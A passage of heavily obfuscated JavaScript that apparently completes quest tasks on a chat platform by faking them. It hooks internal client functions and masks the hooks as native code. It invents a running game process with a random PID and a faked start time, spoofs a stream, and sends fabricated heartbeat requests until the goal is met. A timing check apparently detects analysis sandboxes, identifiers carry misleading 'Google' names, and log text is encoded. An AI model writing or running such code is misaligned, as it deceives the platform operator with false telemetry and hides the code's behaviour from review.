              let _0x21 = { cmdLine, exeName: safeExe, exePath, hidden: false, isLauncher: false, id: v.app, name: safeName, pid: _0x1bReal, pidPath: [_0x1bReal], processName: safeName, start: Date.now() - (120000 + Math.floor(Math.random() * 300000)) };
              Log.say(_0xlex.C(17), _0xlex.P(43,[_0xed(16371),_0xed(16407),_0xed(16449),_0xed(16487),_0xed(16523),_0xed(16555),_0xed(16583),_0xed(16619),_0xed(16648),_0xed(16678),_0xed(16710),_0xed(16748),_0xed(16782),_0xed(16811),_0xed(16839)]) + Object.keys(_0x21).join(", "));
              let _0x23 = [_0x21]; let _0xactivityStarted = false; let undo1 = null, undo2 = null;
              try {
                undo1 = GoogleHook(_0x4, _0xm1, GoogleNative(() => _0x23, "function " + _0xm1 + "() { [native code] }", _0xm1, 0));
                undo2 = GoogleHook(_0x4, _0xm2, GoogleNative(p => _0x23.find(x => x.pid === p), "function " + _0xm2 + "() { [native code] }", _0xm2, 1));
                if (!undo1 || !undo2) throw new Error("hook");
              } catch (e) { try { if (typeof undo2 === 'function') undo2(); } catch (x) {} try { if (typeof undo1 === 'function') undo1(); } catch (x) {} Log.say(_0xlex.C(0), _0xlex.P(8,[_0xed(16872),_0xed(16932),_0xed(16987),_0xed(17049),_0xed(17109),_0xed(17175),_0xed(17227),_0xed(17278),_0xed(17348),_0xed(17407),_0xed(17470),_0xed(17524),_0xed(17573),_0xed(17640),_0xed(17707)])); resolve(); return; }
              
              let cleanupCalled = false, removeSelf = null, watchdog = null, verifyTimer = null, GoogleDesktopHandler = null;
              const cleanup = () => { 
                if (cleanupCalled) return; 
                cleanupCalled = true; 
                
                finishTask();
                Log.diag("phase-c", { state: "ready", activeTaskCount: _0x8844.size }); 
                if (removeSelf) removeSelf(); 
                try { undo1?.(); undo2?.(); } catch (e) {} 
                if (_0xactivityStarted) { try { _0xprimaryActivity.end(_0x21); } catch (e) {} _0xactivityStarted = false; } 
                if (GoogleDesktopHandler) { try { _0xoff(_0xe1, GoogleDesktopHandler); } catch (e) {} } 
                if (watchdog !== null) { clearTimeout(watchdog); watchdog = null; } if (verifyTimer !== null) { clearInterval(verifyTimer); verifyTimer = null; } 
                resolve(); 
              };
              removeSelf = _0xe8a7(cleanup);
              
              try { _0xactivityStarted = await _0xprimaryActivity.begin(_0x21); if (!_0xactivityStarted) throw new Error("activity-busy"); } catch (e) { cleanup(); Log.say(_0xlex.C(0), _0xlex.P(9,[_0xed(17771),_0xed(17823),_0xed(17877),_0xed(17933),_0xed(17984),_0xed(18030),_0xed(18082),_0xed(18126),_0xed(18174),_0xed(18224),_0xed(18271),_0xed(18313),_0xed(18377),_0xed(18423),_0xed(18473)])); resolve(); return; }
              if (cleanupCalled || signal.aborted || _0x5c1f.released) { resolve(); return; }
              
              let stick = 0;
              GoogleDesktopHandler = data => { if (_0xpaus || _0xkill || signal.aborted || cleanupCalled) return; let _0x26 = GoogleProgress(data, GoogleTasks.play, v.cfgv); if (_0x26 === null) return; if (_0xdg8n(v)) { cleanup(); return; } if (++stick % 3 === 1 || _0x26 >= v.goal) Log.say(_0xlex.C(4), _0xlex.P(36,[`${_0xed(18528)}${_0x26}${_0xed(18544)}${v.goal}`,`${_0xed(18547)}${_0x26}${_0xed(18564)}${v.goal}${_0xed(18567)}`,`${_0xed(18570)}${_0x26}${_0xed(18589)}${v.goal}${_0xed(18592)}`,`${_0xed(18595)}${_0x26}${_0xed(18610)}${v.goal}${_0xed(18613)}`,`${_0xed(18629)}${_0x26}${_0xed(18644)}${v.goal}`,`${_0xed(18647)}${_0x26}${_0xed(18664)}${v.goal}${_0xed(18667)}`,`${_0xed(18677)}${_0x26}${_0xed(18694)}${v.goal}${_0xed(18697)}`,`${_0xed(18708)}${_0x26}${_0xed(18727)}${v.goal}${_0xed(18730)}`,`${_0xed(18741)}${_0x26}${_0xed(18756)}${v.goal}${_0xed(18759)}`,`${_0xed(18769)}${_0x26}${_0xed(18788)}${v.goal}${_0xed(18791)}`,`${_0xed(18807)}${_0x26}${_0xed(18823)}${v.goal}${_0xed(18826)}`,`${_0xed(18836)}${_0x26}${_0xed(18853)}${v.goal}${_0xed(18856)}`,`${_0xed(18859)}${_0x26}${_0xed(18876)}${v.goal}${_0xed(18879)}`,`${_0xed(18895)}${_0x26}${_0xed(18911)}${v.goal}${_0xed(18914)}`,`${_0xed(18925)}${_0x26}${_0xed(18941)}${v.goal}${_0xed(18944)}`])); if (_0x26 >= v.goal) Log.say(_0xlex.C(3), _0xlex.P(39,[`${_0xed(18954)}${v.name}${_0xed(18969)}`,`${_0xed(18972)}${v.name}${_0xed(18986)}`,`${_0xed(18989)}${v.name}${_0xed(19001)}`,`${_0xed(19004)}${v.name}${_0xed(19019)}`,`${_0xed(19022)}${v.name}${_0xed(19036)}`,`${_0xed(19039)}${v.name}${_0xed(19052)}`,`${_0xed(19055)}${v.name}${_0xed(19069)}`,`${_0xed(19072)}${v.name}${_0xed(19083)}`,`${_0xed(19086)}${v.name}${_0xed(19101)}`,`${_0xed(19104)}${v.name}${_0xed(19117)}`,`${_0xed(19120)}${v.name}${_0xed(19134)}`,`${_0xed(19137)}${v.name}${_0xed(19151)}`,`${_0xed(19154)}${v.name}${_0xed(19165)}`,`${_0xed(19168)}${v.name}${_0xed(19181)}`,`${_0xed(19184)}${v.name}${_0xed(19194)}`])); if (_0x26 >= v.goal || _0xkill) cleanup(); };
              watchdog = setTimeout(() => cleanup(), Math.max(10 * 60 * 1000, (v.goal - v.cur) * 120000));
              verifyTimer = setInterval(() => { if (cleanupCalled || signal.aborted || _0x5c1f.released) { clearInterval(verifyTimer); verifyTimer = null; return; } _0xverifyDone(v, cleanup); }, 60000);
              
              try { _0xon(_0xe1, GoogleDesktopHandler); } catch (e) { cleanup(); Log.say(_0xlex.C(0), _0xlex.P(10,[_0xed(19197),_0xed(19256),_0xed(19325),_0xed(19386),_0xed(19441),_0xed(19498),_0xed(19550),_0xed(19610),_0xed(19678),_0xed(19744),_0xed(19815),_0xed(19866),_0xed(19933),_0xed(19992),_0xed(20049)])); resolve(); return; }
              
              
              Log.diag("phase-x", { state: "active", activeTaskCount: _0x8844.size });
              handedOff = true; 
              Log.say(_0xlex.C(10), _0xlex.P(44,[`${_0xed(20099)}${safeName}${_0xed(20111)}${Math.ceil((v.goal - v.cur) / 60)}${_0xed(20129)}`,`${_0xed(20138)}${safeName}${_0xed(20152)}${Math.ceil((v.goal - v.cur) / 60)}${_0xed(20170)}`,`${_0xed(20186)}${safeName}${_0xed(20198)}${Math.ceil((v.goal - v.cur) / 60)}${_0xed(20204)}`,`${_0xed(20233)}${safeName}${_0xed(20247)}${Math.ceil((v.goal - v.cur) / 60)}${_0xed(20265)}`,`${_0xed(20274)}${safeName}${_0xed(20299)}${Math.ceil((v.goal - v.cur) / 60)}${_0xed(20317)}`,`${_0xed(20326)}${safeName}${_0xed(20339)}${Math.ceil((v.goal - v.cur) / 60)}${_0xed(20357)}`,`${_0xed(20373)}${safeName}${_0xed(20397)}${Math.ceil((v.goal - v.cur) / 60)}${_0xed(20415)}`,`${_0xed(20431)}${safeName}${_0xed(20456)}${Math.ceil((v.goal - v.cur) / 60)}${_0xed(20474)}`,`${_0xed(20490)}${safeName}${_0xed(20503)}${Math.ceil((v.goal - v.cur) / 60)}${_0xed(20521)}`,`${_0xed(20537)}${safeName}${_0xed(20550)}${Math.ceil((v.goal - v.cur) / 60)}${_0xed(20556)}`,`${_0xed(20585)}${safeName}${_0xed(20605)}${Math.ceil((v.goal - v.cur) / 60)}${_0xed(20623)}`,`${_0xed(20639)}${safeName}${_0xed(20651)}${Math.ceil((v.goal - v.cur) / 60)}${_0xed(20669)}`,`${_0xed(20685)}${safeName}${_0xed(20709)}${Math.ceil((v.goal - v.cur) / 60)}${_0xed(20727)}`,`${_0xed(20743)}${safeName}${_0xed(20768)}${Math.ceil((v.goal - v.cur) / 60)}${_0xed(20786)}`,`${_0xed(20802)}${safeName}${_0xed(20816)}${Math.ceil((v.goal - v.cur) / 60)}${_0xed(20822)}`]));
            } catch (err) {
              finishTask();
              reject(err);
            } finally {
              if (!handedOff) finishTask();
            }
          })();
        });
      };

      const _0xstream = async (v) => {
        const taskId = Symbol(); _0x8844.add(taskId);
        let taskFinished = false; 
        const finishTask = () => { if (!taskFinished) { taskFinished = true; _0x8844.delete(taskId); } };
        
        return new Promise((resolve, reject) => {
          (async () => {
            let handedOff = false;
            try {
              if (!_0xc) { Log.say(_0xlex.C(0), _0xlex.P(6,[`${_0xed(20851)}${v.name}${_0xed(20865)}`,`${_0xed(20911)}${v.name}${_0xed(20925)}`,`${_0xed(20970)}${v.name}${_0xed(20984)}`,`${_0xed(21042)}${v.name}${_0xed(21050)}`,`${_0xed(21097)}${v.name}${_0xed(21111)}`,`${_0xed(21152)}${v.name}${_0xed(21160)}`,`${_0xed(21212)}${v.name}${_0xed(21225)}`,`${_0xed(21270)}${v.name}${_0xed(21284)}`,`${_0xed(21324)}${v.name}${_0xed(21338)}`,`${_0xed(21376)}${v.name}${_0xed(21389)}`,`${_0xed(21428)}${v.name}${_0xed(21442)}`,`${_0xed(21492)}${v.name}${_0xed(21505)}`,`${_0xed(21555)}${v.name}${_0xed(21563)}`,`${_0xed(21622)}${v.name}${_0xed(21636)}`,`${_0xed(21687)}${v.name}${_0xed(21695)}`])); resolve(); return; }
              if (signal.aborted || _0x5c1f.released) { resolve(); return; }
              let _0xpid = Math.floor(Math.random() * 60000) + 4096;
              Log.say(_0xlex.C(5), _0xlex.P(42,[`${_0xed(21737)}${_0xpid % 4 === 0}${_0xed(21773)}${_0xpid}`,`${_0xed(21785)}${_0xpid % 4 === 0}${_0xed(21820)}${_0xpid}`,`${_0xed(21831)}${_0xpid % 4 === 0}${_0xed(21867)}${_0xpid}`,`${_0xed(21878)}${_0xpid % 4 === 0}${_0xed(21910)}${_0xpid}`,`${_0xed(21923)}${_0xpid % 4 === 0}${_0xed(21956)}${_0xpid}`,`${_0xed(21967)}${_0xpid % 4 === 0}${_0xed(22004)}${_0xpid}`,`${_0xed(22016)}${_0xpid % 4 === 0}${_0xed(22053)}${_0xpid}`,`${_0xed(22066)}${_0xpid % 4 === 0}${_0xed(22102)}${_0xpid}`,`${_0xed(22113)}${_0xpid % 4 === 0}${_0xed(22150)}${_0xpid}`,`${_0xed(22161)}${_0xpid % 4 === 0}${_0xed(22198)}${_0xpid}`,`${_0xed(22210)}${_0xpid % 4 === 0}${_0xed(22245)}${_0xpid}`,`${_0xed(22256)}${_0xpid % 4 === 0}${_0xed(22289)}${_0xpid}`,`${_0xed(22301)}${_0xpid % 4 === 0}${_0xed(22338)}${_0xpid}`,`${_0xed(22349)}${_0xpid % 4 === 0}${_0xed(22382)}${_0xpid}`,`${_0xed(22394)}${_0xpid % 4 === 0}${_0xed(22430)}${_0xpid}`]));
              let undo = null;
              try { undo = GoogleHook(_0x3, _0xm0, GoogleNative(() => ({ id: v.app, pid: _0xpid, sourceName: null }), "function " + _0xm0 + "() { [native code] }", _0xm0, 0)); if (!undo) throw new Error("hook"); } catch (e) { Log.say(_0xlex.C(0), _0xlex.P(11,[_0xed(22441),_0xed(22497),_0xed(22547),_0xed(22601),_0xed(22650),_0xed(22708),_0xed(22770),_0xed(22840),_0xed(22909),_0xed(22971),_0xed(23022),_0xed(23073),_0xed(23139),_0xed(23205),_0xed(23259)])); resolve(); return; }
              
              let cleanupCalled = false, removeSelf = null, watchdog = null, verifyTimer = null, GoogleStreamHandler = null;
              const cleanup = () => { 
                if (cleanupCalled) return; 
                cleanupCalled = true; 
                
                finishTask();
                Log.diag("phase-c", { state: "ready", activeTaskCount: _0x8844.size }); 
                if (removeSelf) removeSelf(); 
                try { undo?.(); } catch (e) {} 
                if (GoogleStreamHandler) { try { _0xoff(_0xe1, GoogleStreamHandler); } catch (e) {} } 
                if (watchdog !== null) { clearTimeout(watchdog); watchdog = null; } if (verifyTimer !== null) { clearInterval(verifyTimer); verifyTimer = null; } 
                resolve(); 
              };
              removeSelf = _0xe8a7(cleanup);
              
              let stick = 0;
              GoogleStreamHandler = data => { if (_0xpaus || _0xkill || signal.aborted || cleanupCalled) return; let _0x28 = GoogleProgress(data, GoogleTasks.stream, v.cfgv); if (_0x28 === null) return; if (_0xdg8n(v)) { cleanup(); return; } if (++stick % 3 === 1 || _0x28 >= v.goal) Log.say(_0xlex.C(4), _0xlex.P(37,[`${_0xed(23307)}${_0x28}${_0xed(23326)}${v.goal}${_0xed(23329)}`,`${_0xed(23339)}${_0x28}${_0xed(23356)}${v.goal}`,`${_0xed(23359)}${_0x28}${_0xed(23374)}${v.goal}`,`${_0xed(23377)}${_0x28}${_0xed(23394)}${v.goal}${_0xed(23397)}`,`${_0xed(23408)}${_0x28}${_0xed(23424)}${v.goal}${_0xed(23427)}`,`${_0xed(23443)}${_0x28}${_0xed(23462)}${v.goal}`,`${_0xed(23465)}${_0x28}${_0xed(23480)}${v.goal}${_0xed(23483)}`,`${_0xed(23486)}${_0x28}${_0xed(23505)}${v.goal}${_0xed(23508)}`,`${_0xed(23518)}${_0x28}${_0xed(23533)}${v.goal}${_0xed(23536)}`,`${_0xed(23547)}${_0x28}${_0xed(23563)}${v.goal}${_0xed(23566)}`,`${_0xed(23576)}${_0x28}${_0xed(23595)}${v.goal}${_0xed(23598)}`,`${_0xed(23609)}${_0x28}${_0xed(23626)}${v.goal}${_0xed(23629)}`,`${_0xed(23639)}${_0x28}${_0xed(23656)}${v.goal}${_0xed(23659)}`,`${_0xed(23675)}${_0x28}${_0xed(23692)}${v.goal}${_0xed(23695)}`,`${_0xed(23711)}${_0x28}${_0xed(23730)}${v.goal}${_0xed(23733)}`])); if (_0x28 >= v.goal) Log.say(_0xlex.C(3), _0xlex.P(39,[`${_0xed(23749)}${v.name}${_0xed(23764)}`,`${_0xed(23767)}${v.name}${_0xed(23781)}`,`${_0xed(23784)}${v.name}${_0xed(23796)}`,`${_0xed(23799)}${v.name}${_0xed(23814)}`,`${_0xed(23817)}${v.name}${_0xed(23831)}`,`${_0xed(23834)}${v.name}${_0xed(23847)}`,`${_0xed(23850)}${v.name}${_0xed(23864)}`,`${_0xed(23867)}${v.name}${_0xed(23878)}`,`${_0xed(23881)}${v.name}${_0xed(23896)}`,`${_0xed(23899)}${v.name}${_0xed(23912)}`,`${_0xed(23915)}${v.name}${_0xed(23929)}`,`${_0xed(23932)}${v.name}${_0xed(23946)}`,`${_0xed(23949)}${v.name}${_0xed(23960)}`,`${_0xed(23963)}${v.name}${_0xed(23976)}`,`${_0xed(23979)}${v.name}${_0xed(23989)}`])); if (_0x28 >= v.goal || _0xkill) cleanup(); };
              watchdog = setTimeout(() => cleanup(), Math.max(10 * 60 * 1000, (v.goal - v.cur) * 120000));
              verifyTimer = setInterval(() => { if (cleanupCalled || signal.aborted || _0x5c1f.released) { clearInterval(verifyTimer); verifyTimer = null; return; } _0xverifyDone(v, cleanup); }, 60000);
              
              try { _0xon(_0xe1, GoogleStreamHandler); } catch (e) { cleanup(); Log.say(_0xlex.C(0), _0xlex.P(12,[_0xed(23992),_0xed(24050),_0xed(24101),_0xed(24163),_0xed(24233),_0xed(24289),_0xed(24345),_0xed(24401),_0xed(24466),_0xed(24515),_0xed(24567),_0xed(24625),_0xed(24683),_0xed(24732),_0xed(24800)])); resolve(); return; }
              
              
              Log.diag("phase-x", { state: "active", activeTaskCount: _0x8844.size });
              handedOff = true; 
              Log.say(_0xlex.C(11), _0xlex.P(45,[`${_0xed(24867)}${Math.ceil((v.goal - v.cur) / 60)}${_0xed(24911)}`,`${_0xed(24927)}${Math.ceil((v.goal - v.cur) / 60)}${_0xed(24981)}`,`${_0xed(24997)}${Math.ceil((v.goal - v.cur) / 60)}${_0xed(25055)}`,`${_0xed(25071)}${Math.ceil((v.goal - v.cur) / 60)}${_0xed(25118)}`,`${_0xed(25134)}${Math.ceil((v.goal - v.cur) / 60)}${_0xed(25188)}`,`${_0xed(25201)}${Math.ceil((v.goal - v.cur) / 60)}${_0xed(25243)}`,`${_0xed(25259)}${Math.ceil((v.goal - v.cur) / 60)}${_0xed(25310)}`,`${_0xed(25326)}${Math.ceil((v.goal - v.cur) / 60)}${_0xed(25376)}`,`${_0xed(25389)}${Math.ceil((v.goal - v.cur) / 60)}${_0xed(25428)}`,`${_0xed(25444)}${Math.ceil((v.goal - v.cur) / 60)}${_0xed(25487)}`,`${_0xed(25500)}${Math.ceil((v.goal - v.cur) / 60)}${_0xed(25546)}`,`${_0xed(25562)}${Math.ceil((v.goal - v.cur) / 60)}${_0xed(25614)}`,`${_0xed(25627)}${Math.ceil((v.goal - v.cur) / 60)}${_0xed(25674)}`,`${_0xed(25687)}${Math.ceil((v.goal - v.cur) / 60)}${_0xed(25737)}`,`${_0xed(25753)}${Math.ceil((v.goal - v.cur) / 60)}${_0xed(25809)}`]));
            } catch (err) {
              finishTask();
              reject(err);
            } finally {
              if (!handedOff) finishTask();
            }
          })();
        });
      };

      const _0xact = async (v) => {
        if (!_0x6 || !_0x7) { Log.say(_0xlex.C(0), _0xlex.P(13,[_0xed(25825),_0xed(25887),_0xed(25935),_0xed(25993),_0xed(26058),_0xed(26117),_0xed(26178),_0xed(26240),_0xed(26303),_0xed(26350),_0xed(26397),_0xed(26447),_0xed(26512),_0xed(26574),_0xed(26627)])); return; }
        let _0x29; try { _0x29 = _0x6[_0xm8]()[0]?.id; } catch (e) {}
        if (!_0x29) { try { const guilds = Object.values(_0x7[_0xm9]()); const _0xvg = guilds.find(x => x && x.VOCAL && x.VOCAL.length); if (_0xvg) _0x29 = _0xvg.VOCAL[0].channel.id; } catch (e) {} if (!_0x29) { Log.say(_0xlex.C(0), _0xlex.P(13,[_0xed(26685),_0xed(26747),_0xed(26795),_0xed(26853),_0xed(26918),_0xed(26977),_0xed(27038),_0xed(27100),_0xed(27163),_0xed(27210),_0xed(27257),_0xed(27307),_0xed(27372),_0xed(27434),_0xed(27487)])); return; } }
        let _0x2a = "call:" + _0x29 + ":" + Array.from({length: 16}, () => Math.floor(Math.random() * 16).toString(16)).join('');
        Log.say(_0xlex.C(19), _0xlex.P(46,[`${_0xed(27545)}${Math.ceil((v.goal - v.cur) / 60)}${_0xed(27581)}`,`${_0xed(27589)}${Math.ceil((v.goal - v.cur) / 60)}${_0xed(27614)}`,`${_0xed(27626)}${Math.ceil((v.goal - v.cur) / 60)}${_0xed(27661)}`,`${_0xed(27674)}${Math.ceil((v.goal - v.cur) / 60)}${_0xed(27706)}`,`${_0xed(27714)}${Math.ceil((v.goal - v.cur) / 60)}${_0xed(27750)}`,`${_0xed(27763)}${Math.ceil((v.goal - v.cur) / 60)}${_0xed(27798)}`,`${_0xed(27810)}${Math.ceil((v.goal - v.cur) / 60)}${_0xed(27849)}`,`${_0xed(27862)}${Math.ceil((v.goal - v.cur) / 60)}${_0xed(27896)}`,`${_0xed(27908)}${Math.ceil((v.goal - v.cur) / 60)}${_0xed(27939)}`,`${_0xed(27951)}${Math.ceil((v.goal - v.cur) / 60)}${_0xed(27983)}`,`${_0xed(27996)}${Math.ceil((v.goal - v.cur) / 60)}${_0xed(28031)}`,`${_0xed(28039)}${Math.ceil((v.goal - v.cur) / 60)}${_0xed(28065)}`,`${_0xed(28073)}${Math.ceil((v.goal - v.cur) / 60)}${_0xed(28113)}`,`${_0xed(28126)}${Math.ceil((v.goal - v.cur) / 60)}${_0xed(28162)}`,`${_0xed(28175)}${Math.ceil((v.goal - v.cur) / 60)}${_0xed(28208)}`]));
        const _0xactivityDeadline = Date.now() + _0xvmExec([
          0x02, "goal", 0x02, "cur", 0x04, 0x01, 120000, 0x05, // (goal - cur) * 120000
          0x01, 600000, 0x0D, // Math.max(..., 600000)
          0x0F // return
        ], { goal: v.goal, cur: v.cur });
        let tick = 0;
        while (v.cur < v.goal && !_0xkill && !signal.aborted && Date.now() < _0xactivityDeadline) {
          if (_0xpaus) { await GoogleDelay(3); continue; }
          let _0x2b = await GooglePostSafe({ url: GoogleRoutes.heartbeat(v.q.id), body: { [_0xq9]: _0x2a, terminal: false } });
          const reportedProgress = _0xbb86(_0x2b?.body, GoogleTasks.activity);
          if (reportedProgress !== null) v.cur = reportedProgress; if (_0xdg8n(v, reportedProgress)) break;
          if (++tick % 3 === 1 || v.cur >= v.goal) Log.say(_0xlex.C(4), _0xlex.P(38,[`${_0xed(28221)}${v.cur}${_0xed(28240)}${v.goal}${_0xed(28243)}`,`${_0xed(28253)}${v.cur}${_0xed(28268)}${v.goal}${_0xed(28271)}`,`${_0xed(28281)}${v.cur}${_0xed(28296)}${v.goal}${_0xed(28299)}`,`${_0xed(28302)}${v.cur}${_0xed(28318)}${v.goal}${_0xed(28321)}`,`${_0xed(28331)}${v.cur}${_0xed(28348)}${v.goal}${_0xed(28351)}`,`${_0xed(28361)}${v.cur}${_0xed(28380)}${v.goal}${_0xed(28383)}`,`${_0xed(28393)}${v.cur}${_0xed(28410)}${v.goal}${_0xed(28413)}`,`${_0xed(28416)}${v.cur}${_0xed(28431)}${v.goal}${_0xed(28434)}`,`${_0xed(28445)}${v.cur}${_0xed(28462)}${v.goal}${_0xed(28465)}`,`${_0xed(28481)}${v.cur}${_0xed(28500)}${v.goal}`,`${_0xed(28503)}${v.cur}${_0xed(28518)}${v.goal}${_0xed(28521)}`,`${_0xed(28531)}${v.cur}${_0xed(28548)}${v.goal}${_0xed(28551)}`,`${_0xed(28561)}${v.cur}${_0xed(28577)}${v.goal}${_0xed(28580)}`,`${_0xed(28583)}${v.cur}${_0xed(28602)}${v.goal}${_0xed(28605)}`,`${_0xed(28608)}${v.cur}${_0xed(28625)}${v.goal}`]));
          await GoogleDelay(20);
          if (v.cur >= v.goal) { await GoogleDelay(2); if (_0xkill || signal.aborted) break; if (!_0xkill && !signal.aborted) await GooglePostSafe({ url: GoogleRoutes.heartbeat(v.q.id), body: { [_0xq9]: _0x2a, terminal: true } }); break; }
        }
        if (v.cur >= v.goal) Log.say(_0xlex.C(3), _0xlex.P(39,[`${_0xed(28628)}${v.name}${_0xed(28643)}`,`${_0xed(28646)}${v.name}${_0xed(28660)}`,`${_0xed(28663)}${v.name}${_0xed(28675)}`,`${_0xed(28678)}${v.name}${_0xed(28693)}`,`${_0xed(28696)}${v.name}${_0xed(28710)}`,`${_0xed(28713)}${v.name}${_0xed(28726)}`,`${_0xed(28729)}${v.name}${_0xed(28743)}`,`${_0xed(28746)}${v.name}${_0xed(28757)}`,`${_0xed(28760)}${v.name}${_0xed(28775)}`,`${_0xed(28778)}${v.name}${_0xed(28791)}`,`${_0xed(28794)}${v.name}${_0xed(28808)}`,`${_0xed(28811)}${v.name}${_0xed(28825)}`,`${_0xed(28828)}${v.name}${_0xed(28839)}`,`${_0xed(28842)}${v.name}${_0xed(28855)}`,`${_0xed(28858)}${v.name}${_0xed(28868)}`]));
        else if (!_0xkill && !signal.aborted && Date.now() >= _0xactivityDeadline) Log.say(_0xlex.C(0), _0xlex.P(14,[`${_0xed(28871)}${v.name}${_0xed(28882)}`,`${_0xed(28947)}${v.name}${_0xed(28958)}`,`${_0xed(29019)}${v.name}${_0xed(29030)}`,`${_0xed(29095)}${v.name}${_0xed(29106)}`,`${_0xed(29170)}${v.name}${_0xed(29181)}`,`${_0xed(29244)}${v.name}${_0xed(29255)}`,`${_0xed(29316)}${v.name}${_0xed(29327)}`,`${_0xed(29396)}${v.name}${_0xed(29407)}`,`${_0xed(29469)}${v.name}${_0xed(29480)}`,`${_0xed(29536)}${v.name}${_0xed(29547)}`,`${_0xed(29603)}${v.name}${_0xed(29614)}`,`${_0xed(29679)}${v.name}${_0xed(29690)}`,`${_0xed(29748)}${v.name}${_0xed(29759)}`,`${_0xed(29827)}${v.name}${_0xed(29838)}`,`${_0xed(29897)}${v.name}${_0xed(29908)}`]));
      };

      const _0xsymMap = new Map([
        [GoogleTasks.video, Symbol.for("g.v1")],
        [GoogleTasks.videoMobile, Symbol.for("g.v2")],
        [GoogleTasks.play, Symbol.for("g.p1")],
        [GoogleTasks.stream, Symbol.for("g.s1")],
        [GoogleTasks.activity, Symbol.for("g.a1")]
      ]);
      const GoogleHandlers = {
        [_0xsymMap.get(GoogleTasks.video)]: _0xvideo,
        [_0xsymMap.get(GoogleTasks.videoMobile)]: _0xvideo,
        [_0xsymMap.get(GoogleTasks.play)]: _0xplay,
        [_0xsymMap.get(GoogleTasks.stream)]: _0xstream,
        [_0xsymMap.get(GoogleTasks.activity)]: _0xact
      };

      const _0x10 = async (_0x11) => {
        let _0x15 = _0x79a4(_0x11.config, GoogleRoutes.tasks);
        if (!_0x15?.tasks) { Log.say(_0xlex.C(0), _0xlex.P(15,[_0xed(29961),_0xed(30017),_0xed(30067),_0xed(30116),_0xed(30159),_0xed(30200),_0xed(30251),_0xed(30307),_0xed(30362),_0xed(30420),_0xed(30470),_0xed(30519),_0xed(30571),_0xed(30621),_0xed(30666)])); return "skipped"; }
        let _0x16 = GoogleRoutes.tasks.find(t => Object.hasOwn(_0x15.tasks, t));
        let _0x17 = _0x16 ? _0x15.tasks[_0x16] : null;
        let _0x19 = Number(_0x17?.target);
        if (!Number.isFinite(_0x19) || _0x19 <= 0) { Log.say(_0xlex.C(0), _0xlex.P(16,[_0xed(30720),_0xed(30761),_0xed(30808),_0xed(30853),_0xed(30898),_0xed(30950),_0xed(30999),_0xed(31046),_0xed(31095),_0xed(31140),_0xed(31195),_0xed(31246),_0xed(31285),_0xed(31333),_0xed(31376)])); return "skipped"; }
        let _0x18 = _0x11.config?.application?.id ?? _0x17?.applications?.[0]?.id;
        if ((_0x16 === GoogleTasks.play || _0x16 === GoogleTasks.stream) && !_0x18) { Log.say(_0xlex.C(0), _0xlex.P(17,[_0xed(31430),_0xed(31480),_0xed(31539),_0xed(31589),_0xed(31646),_0xed(31688),_0xed(31732),_0xed(31781),_0xed(31835),_0xed(31880),_0xed(31933),_0xed(31984),_0xed(32037),_0xed(32094),_0xed(32149)])); return "skipped"; }
        let _0x1a = _0x11?.[_0xqa]?.progress?.[_0x16]?.value ?? 0;
        let _0x1b = Math.floor(Math.random() * 60000) + 4096;
        const _0xsymKey = _0xsymMap.get(_0x16);
        const fn = _0xsymKey ? GoogleHandlers[_0xsymKey] : null;
        if (!fn) return "unsupported";
        const _0x1c0 = { q: _0x11, taskType: _0x16, name: _0x11.config?.messages?.[_0xq8] ?? "task", app: _0x18, goal: _0x19, cur: _0x1a, pid: _0x1b, cfgv: _0x11?.config?.[_0xqe] };
        await fn(_0x1c0);
        if (_0x1c0._0xda) return "static";
        return "processed";
      };

      let _0xstarted = false;
      // R2-05a/R2-05b: measure a real store-shaped round trip before the core
      // starts, then derive the VM dispatch word from that observation. The short
      // scheduled interval is intentional: an instant Proxy and a browser event
      // loop do not produce the same timing profile.
      const _0xfnvRuntime = s => { let h = 0x811c9dc5; for (let i = 0; i < s.length; i++) { h ^= s.charCodeAt(i); h = Math.imul(h, 0x01000193) >>> 0; } return h >>> 0; };
      const _0xlatencyFaC = async () => {
        const t0 = Date.now();
        let before = 0, after = 0;
        try { const v = _0xr2.store.values(_0x5[_0xq7]); before = typeof v === 'function' && Array.isArray(Array.from(v.call(_0x5[_0xq7]))) ? 1 : 0; } catch (e) {}
        const slot = 7 + ((_0xmodules.length + _0xeligible.length) & 3);
        await new Promise(resolve => setTimeout(resolve, slot));
        const elapsed = Date.now() - t0;
        try { const v = _0xr2.store.values(_0x5[_0xq7]); after = typeof v === 'function' && Array.isArray(Array.from(v.call(_0x5[_0xq7]))) ? 1 : 0; } catch (e) {}
        const plausible = elapsed >= 3 && elapsed <= 5000 && before === 1 && after === 1;
        const shape = [elapsed, before, after, _0xmodules.length, _0xpocketsComplete ? 1 : 0].join(':');
        _0xruntimeKey = _0xfnvRuntime('core|' + shape + '|8.13');
        _0xruntimeKeyReady = plausible;
        try { Log.diag('phase-st', { elapsedMs: elapsed, plausible, shape: shape.length }); } catch (e) {}
        return plausible;
      };
      const _0x2c = async () => {
        if (_0xstarted) return; _0xstarted = true;
        if (!await _0xlatencyFaC()) { try { Log.say(_0xlex.C(0), 'Shelf timing was not plausible — standing by.'); } catch (e) {} try { GoogleRelease(); } catch (e) {} try { _0xmod.host?.shut?.(); } catch (e) {} return; }
                let didWork = false; const _0xresults = []; const _0xdone = new Set(); let _0xdsc = 0;
        let _0xcur = null;
        const _0xrefill = () => {
          try {
            let _0list = [];
            let _0storeDead = false;
            try {
              const _0v = _0xr2.store.values(_0x5[_0xq7]);
              if (typeof _0v === "function") _0list = Array.from(_0v.call(_0x5[_0xq7]));
              else _0storeDead = true;
            } catch (e) { _0storeDead = true; }
            if (_0storeDead) {
              try { Log.say(_0xlex.C(0), 'Shelf out of reach — queued chores stand, new arrivals unwatched.'); } catch (e) {}
              try { Log.diag("phase-n", { added: 0, storeDead: true, totalCandidateStores: -1, recheckWindowSeconds: 15 }); } catch (e) {}
              return 0;
            }
            let _0added = 0;
            const _0skip = { seen: 0, queued: 0, unenrolled: 0, settled: 0, expired: 0, wrap: 0, misshapen: 0 };
            for (const q of _0list) {
              try {
                if (!q || typeof q !== "object" || !q.id || _0xdone.has(q.id)) { _0skip.seen++; continue; }
                if (_0xb.some(x => x && x.id === q.id)) { _0skip.queued++; continue; }
                if (!q?.[_0xqa]?.[_0xqb]) { _0skip.unenrolled++; continue; }
                if (q?.[_0xqa]?.[_0xqc]) { _0skip.settled++; continue; }
                const _0e = new Date(q.config?.expiresAt).getTime();
                if (Number.isFinite(_0e) && _0e <= Date.now() - 5 * 60 * 1000) { _0skip.expired++; continue; }
                if (!_0x79a4(q.config, GoogleRoutes.tasks)?.tasks) { _0skip.wrap++; continue; }
